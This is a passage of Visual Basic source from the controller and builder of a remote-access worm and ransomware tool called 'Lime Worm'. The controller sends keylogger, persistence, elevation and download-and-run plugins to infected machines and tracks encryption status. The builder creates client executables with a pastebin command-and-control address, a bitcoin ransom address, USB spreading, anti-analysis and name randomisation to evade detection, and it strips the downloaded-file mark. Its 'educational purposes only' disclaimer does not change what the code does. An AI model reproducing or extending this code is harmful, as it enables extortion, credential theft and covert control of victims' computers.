                Dim CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + F))
                MS.Write(CMD, 0, CMD.Length)
                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        S.SendData(x.Tag, MS.ToArray)
                        x.BackColor = Color.DarkSlateGray
                    End If
                Next
                MS.Dispose()
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub UpdateFromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdateFromURLToolStripMenuItem.Click
        Try
            Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
            Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

            If String.IsNullOrEmpty(URL) Then
                Exit Sub
            Else
                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "5" + "|'P'|" + URL + "|'P'|" + EXE)
                        x.BackColor = Color.DarkSlateGray
                    End If
                Next
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|2")
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|1")
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        Try
            Dim result As DialogResult
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Encrypted" Then
                        result = MessageBox.Show("Client didn't finish decrypting yet.." & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
                        If result = DialogResult.Yes Then
                            S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3")
                            x.BackColor = Color.DarkSlateGray
                        End If
                    Else
                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3")
                        x.BackColor = Color.DarkSlateGray
                    End If
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try

    End Sub

#End Region

#Region "Others"

    Private Sub PersistenceToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PersistenceToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PERS.dll"), True)) + SPL + " ")
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                Dim KL As Keylogger = My.Application.OpenForms("KL" + x.SubItems(ID.Index).Text)
                If KL Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\KLG.dll"), True)) + SPL + " ")
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Title = "RUN"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                Dim MS As New IO.MemoryStream
                Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
                Dim F = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True))
                Dim CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "RD-|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + F))
                MS.Write(CMD, 0, CMD.Length)
                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        S.SendData(x.Tag, MS.ToArray)
                        x.BackColor = Color.DarkSlateGray
                    End If
                Next
                MS.Dispose()
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
        Try
            Dim URL As String = InputBox("Enter the direct link", "Run File", "http: //site.com/file.exe")
            Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

            If String.IsNullOrEmpty(URL) Then
                Exit Sub
            Else
                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "RU-|'P'|" + URL.ToString + "|'P'|" + EXE.ToString)
                        x.BackColor = Color.DarkSlateGray
                    End If
                Next
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub VisitWebsiteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VisitWebsiteToolStripMenuItem.Click
        Try
            Dim URL As String = InputBox("Enter URL", "Visit URL", "http://google.com")

            If String.IsNullOrEmpty(URL) Then
                Exit Sub
            Else
                If Not URL.StartsWith("http") Then
                    URL = "http://" + URL
                End If
                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "Visit|'P'|" + URL)
                        x.BackColor = Color.DarkSlateGray
                    End If
                Next
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub RunAsAdministratorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunAsAdministratorToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PRI|'P'|")
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        About.Show()
    End Sub

    Private Sub ClientNoteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClientNoteToolStripMenuItem.Click
        On Error Resume Next
        Dim note As String = InputBox("Enter note", "", "")
        For Each x As ListViewItem In L1.SelectedItems
            STV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Note", note)
            x.SubItems(NOTE_.Index).Text = note
        Next
    End Sub

    Private Sub ClientColorToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ClientColorToolStripMenuItem1.Click
        On Error Resume Next

        Dim cDialog As New ColorDialog
        For Each x As ListViewItem In L1.SelectedItems
            If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                If (cDialog.ShowDialog() = DialogResult.OK) Then
                    x.ForeColor = cDialog.Color
                    Dim CCC = ColorTranslator.ToHtml(cDialog.Color)
                    STV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Color", CCC)
                Else
                    DLV(x.SubItems(ID.Index).Text + "_" + x.SubItems(USERN.Index).Text + " Color")
                    x.ForeColor = Color.FromArgb(142, 188, 0)
                End If
            End If
        Next
    End Sub

    Private Sub ClientFolderToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ClientFolderToolStripMenuItem1.Click
        On Error Resume Next
        For Each x As ListViewItem In L1.SelectedItems
            Process.Start(uFolder(x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text, ""))
        Next
    End Sub

    Private Sub RemoveOfflineToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveOfflineToolStripMenuItem.Click
        On Error Resume Next
        For Each x As ListViewItem In L1.Items
            If x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                x.Remove()
            End If
        Next
        Dim myWriter As New IO.StreamWriter("MISC/USERS.dat")
        myWriter.WriteLine("")
        myWriter.Close()
    End Sub


#End Region

#Region "OnConnect"

    Private Sub OnConnectToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OnConnectToolStripMenuItem.Click
        OnConnect.Show()
    End Sub

    Public ClientEXE As String
    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles AutoUpdate.Tick
        For Each x As ListViewItem In L1.Items
            If x.SubItems(VER.Index).Text <> S_Settings.StubVer AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(ClientEXE) + "|'P'|" + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(ClientEXE), True)))
                Messages(x.SubItems(IP.Index).Text, "Updated to [" + S_Settings.StubVer + "] using Auto-Update")
            End If
        Next
    End Sub

    'Ping all clients
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles PingClients.Tick
        Try
            For Each x As ListViewItem In L1.Items
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "!PSend")
                End If
            Next
        Catch : End Try
    End Sub

#End Region

#End Region


#Region "Builder"

    Private Sub MetroButton1_Click(sender As Object, e As EventArgs) Handles MetroButton1.Click
        Try
            Dim result As DialogResult
            result = MessageBox.Show("I, the creator, am not responsible for any actions, and or damages, caused by this software. " & vbNewLine & vbNewLine & "You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only." & vbNewLine & vbNewLine & "This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use." & vbNewLine & vbNewLine & "By pressing ""YES"" button, you automatically agree to the above.", "Lime Worm | Disclaimer" & vbNewLine & vbNewLine, MessageBoxButtons.YesNo)
            If result = DialogResult.No Then
                Return
            ElseIf result = DialogResult.Yes Then

                If Not IO.File.Exists(Application.StartupPath & "\Misc\Stub\Stub.il") Then
                    MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
                    Return
                End If

                If radioNET2.Checked Then
                    If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v2.0.50727\ilasm.exe") Then
                        Dim process As New Process()
                        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                        process.StartInfo.FileName = "cmd.exe"
                        process.StartInfo.UseShellExecute = True
                        process.StartInfo.CreateNoWindow = True
                        process.StartInfo.Arguments = "/C C:\Windows\Microsoft.NET\Framework\v2.0.50727\ilasm.exe """ & Application.StartupPath + "\Misc\Stub\Stub.il""" & " /out=""" & Application.StartupPath + "\Misc\Stub\Stub.exe""" & ""
                        process.Start()
                        process.WaitForExit()
                    Else
                        MsgBox("Framework 2.0 is not installed!", MsgBoxStyle.Critical)
                        Return
                    End If
                Else
                    If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe") Then
                        Dim process As New Process()
                        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                        process.StartInfo.FileName = "cmd.exe"
                        process.StartInfo.UseShellExecute = True
                        process.StartInfo.CreateNoWindow = True
                        process.StartInfo.Arguments = "/C C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe """ & Application.StartupPath + "\Misc\Stub\Stub.il""" & " /out=""" & Application.StartupPath + "\Misc\Stub\Stub.exe""" & ""
                        process.Start()
                        process.WaitForExit()
                    Else
                        MsgBox("Framework 4.0 is not installed!", MsgBoxStyle.Critical)
                        Return
                    End If
                End If

                If _exe.Text = "" Then
                    _exe.Text = "Wservices.exe"
                End If

                If _path1.Text = "" Then
                    _path1.Text = "Temp"
                End If

                If Not _exe.Text.EndsWith(".exe") Then
                    _exe.Text = _exe.Text + ".exe"
                End If

                If Not _path2.Text.StartsWith("\") Then
                    _path2.Text = "\" + _path2.Text
                End If
                If Not _path2.Text.EndsWith("\") Then
                    _path2.Text = _path2.Text + "\"
                End If

                If Not IO.File.Exists(Application.StartupPath & "\Misc\Stub\Stub.exe") Then
                    MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
                    Return
                ElseIf _pastebin.Text = "" Or Not _pastebin.Text.Contains("http") Then
                    MsgBox("Enter pastebin raw url", MsgBoxStyle.Critical, Nothing)
                    Return
                Else

                    Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath & "\Misc\Stub\Stub.exe")
                    If chkRename.Checked Then
                        definition.Name = New AssemblyNameDefinition(Randomi(rand.Next(6, 20)), New Version(rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10)))
                        definition.CustomAttributes.Clear()
                    End If
                    Dim definition2 As ModuleDefinition
                    For Each definition2 In definition.Modules
                        If chkRename.Checked Then
                            definition2.Name = Randomi(rand.Next(5, 15))
                        End If
                        Dim definition3 As TypeDefinition
                        For Each definition3 In definition2.Types
                            If chkRename.Checked Then
                                If definition3.Namespace = "Client.Lime" Then
                                    definition3.Namespace = Randomi(rand.Next(5, 15))
                                    definition3.Name = Randomi(rand.Next(5, 15))
                                End If
                                For Each F In definition3.Fields
                                    F.Name = Randomi(rand.Next(5, 15))
                                Next
                            End If
                            Dim definition4 As MethodDefinition
                            For Each definition4 In definition3.Methods
                                If Not definition4.IsConstructor AndAlso Not definition4.IsRuntimeSpecialName Then
                                    If chkRename.Checked Then
                                        definition4.Name = Randomi(rand.Next(5, 15))
                                        For Each P As ParameterDefinition In definition4.Parameters
                                            P.Name = Randomi(rand.Next(5, 15))
                                        Next
                                    End If
                                ElseIf (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                    Dim enumerator As IEnumerator(Of Instruction)
                                    Try
                                        enumerator = definition4.Body.Instructions.GetEnumerator
                                        Do While enumerator.MoveNext
                                            Dim current As Instruction = enumerator.Current
                                            If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                                Dim str As String = current.Operand.ToString
                                                If (str = "%Delay%") Then
                                                    current.Operand = _numDelay.Value.ToString
                                                End If
                                                If (str = "%Pastebin%") Then
                                                    current.Operand = S_Encryption.AES_Encrypt(_pastebin.Text)
                                                End If
                                                If (str = "%EXE%") Then
                                                    current.Operand = _exe.Text
                                                End If
                                                If (str = "%SPL%") Then
                                                    current.Operand = S_Settings.SPL
                                                End If
                                                If (str = "%KEY%") Then
                                                    current.Operand = S_Settings.ENDOF
                                                End If
                                                If (str = "%PASS%") Then
                                                    current.Operand = S_Settings.EncryptionKey
                                                End If
                                                If (str = "%DROP%") Then
                                                    current.Operand = _drop.Checked.ToString
                                                End If
                                                If (str = "%PATH1%") Then
                                                    current.Operand = _path1.Text
                                                End If
                                                If (str = "%PATH2%") Then
                                                    current.Operand = _path2.Text
                                                End If
                                                If (str = "%BTC_ADDR%") Then
                                                    current.Operand = _btc.Text
                                                End If
                                                If (str = "%USB%") Then
                                                    current.Operand = _usb.Checked.ToString
                                                End If
                                                If (str = "%PIN%") Then
                                                    current.Operand = _pin.Checked.ToString
                                                End If
                                                If (str = "%ANTI%") Then
                                                    current.Operand = _anti.Checked.ToString
                                                End If
                                                If (str = "%DWN_CHK%") Then
                                                    current.Operand = _dwnchk.Checked.ToString
                                                End If
                                                If (str = "%DWN_LINK%") Then
                                                    current.Operand = _dwnlink.Text
                                                End If
                                            End If
                                        Loop
                                    Finally
                                    End Try

                                End If
                            Next
                        Next
                    Next

                    definition.Write(Application.StartupPath + "\" + "NEW-CLIENT.exe")
                    If _icon.Checked = True AndAlso PictureBox1.ImageLocation <> "" Then
                        S_IconChanger.InjectIcon(Application.StartupPath + "\" + "NEW-CLIENT.exe", PictureBox1.ImageLocation)
                    End If
                    MsgBox("Your Client Has been Created Successfully", MsgBoxStyle.Information, "DONE!")
                    My.Settings.Save()
                    definition.Dispose()
                    Try : DeleteZoneIdentifier(Application.StartupPath + "\" + "NEW-CLIENT.exe") : Catch : End Try
                    Try : IO.File.Delete(Application.StartupPath & "\Misc\Stub\Stub.exe") : Catch : End Try
                End If
            End If
        Catch ex1 As Exception
            MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
            Return
        End Try

    End Sub

    Private Sub _drop_CheckedChanged(sender As Object, e As EventArgs) Handles _drop.CheckedChanged
        If _drop.Checked = True Then
            _exe.Enabled = True
            _path1.Enabled = True
            _path2.Enabled = True
        Else
            _exe.Enabled = False
            _path1.Enabled = False
            _path2.Enabled = False
        End If
    End Sub

    Private Sub MetroTile1_Click(sender As Object, e As EventArgs) Handles MetroTile1.Click
        Try : BackgroundWorker2.RunWorkerAsync() : Catch : End Try
    End Sub

    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
        Try
            Dim x As String
            Dim wc As New Net.WebClient
            Dim rx As New Text.RegularExpressions.Regex("^(?:(?:25[0-5]|2[0-4]\d|[01]\d\d|\d?\d)(?(?=\.?\d)\.)){4}$")
            x = wc.DownloadString(_pastebin.Text)

            If rx.IsMatch(x.Split(":")(0)) AndAlso x.Split(":")(1) <= 65535 Then
                If x.Split(":")(0) = GetExternalAddress() AndAlso S_Settings.PORT.Contains(x.Split(":")(1)) Then
                    MsgBox("Valid! " + x, MsgBoxStyle.Information)
                Else
                    MsgBox(x + Environment.NewLine + "IP or port doesn't match your current settings", MsgBoxStyle.Critical)
                End If
            Else
                MsgBox("Wrong format", MsgBoxStyle.Critical)
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub

    Private Sub _icon_CheckedChanged(sender As Object, e As EventArgs) Handles _icon.CheckedChanged
        Try
            If _icon.Checked = True Then
                Dim o As New OpenFileDialog
                With o
                    .Filter = "*.ico (*.ico)| *.ico"
                    .InitialDirectory = Application.StartupPath + "\Misc\Icons"
                    .Title = "Select Icon"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                    PictureBox1.ImageLocation = o.FileName
                Else
                    _icon.Checked = False
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub





#End Region


End Class